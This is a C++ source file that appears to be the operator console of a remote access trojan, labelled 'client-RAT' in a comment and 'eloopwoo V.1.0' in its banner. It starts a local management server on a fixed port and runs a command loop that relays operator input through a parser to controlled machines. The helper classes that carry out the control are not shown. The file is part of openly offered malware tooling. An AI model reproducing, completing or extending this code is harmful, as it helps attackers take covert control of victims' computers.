// client.cpp : Defines the entry point for the console application.
//

#include "stdafx.h" 
/*
stdafx.h
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
*/
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <stdio.h>
#include "client.h"
#include "server.h"
#include "parser.h"
#include <iostream>
#include <string>

#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_REMOTE_PORT 27185
#define DEFAULT_LOCAL_PORT  27186
//#define DEBUG_MODE
int main()
{
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hConsole, (FOREGROUND_GREEN));
	printf("               _                    _    \n");
	printf("              | |                  | |   \n");
	printf(" ______      _| |__   __ ___      _| | __\n");
	printf("|_  /\\ \\ /\\ / / '_ \\ / _` \\ \\ /\\ / / |/ /\n");
	printf(" / /  \\ V  V /| | | | (_| |\\ V  V /|   < \n");
	printf("/___|  \\_/\\_/ |_| |_|\\__,_| \\_/\\_/ |_|\\_\\\n\n");
	printf("eloopwoo V.1.0\n");
	/*
	char server_ip[16];
	printf("Welcome to client-RAT!\n");
	printf("Enter server ip:\n");
	scanf("%s", server_ip);
	*/
	client::initWSA();

	server manageServer = server();
	manageServer.runManagerServer(DEFAULT_LOCAL_PORT);
	/*
	while (1) {
		getchar();
	}
	*/
	#ifndef DEBUG_MODE
	/*

	client ratClient = client();

	if (ratClient.Tryconnect(server_ip)) {
		printf("successfully connected to %s\n", server_ip);
	}
	else {
		printf("fail to connect %s\n", server_ip);
		ExitProcess(1);
	}
	*/
	char recData[BUFLEN];
	char userInput[BUFLEN];
	char userOption[BUFLEN];
 	std::string input_string;
	Parser parser = Parser();
	parser.managementServer = &manageServer;
	std::cout << "$help - help menu" << std::endl;

	while (1) {
		memset(userInput, 0, BUFLEN);
		memset(userOption, 0, BUFLEN);
		memset(recData, 0, BUFLEN);

		// get new command from user
		std::cout << ">>> ";
		std::getline(std::cin, input_string);
		if (!(input_string != "$exit"))
			break;
		try {
			if (!(parser.parseString(input_string, recData)))
				std::cout << "Error occured-";
			std::cout << recData << std::endl;
		}
		catch (std::exception& e) {
			std::cout << e.what() << std::endl;
		}
	}
		
	SetConsoleTextAttribute(hConsole, (0x0000));
	#endif
	return 0;
}

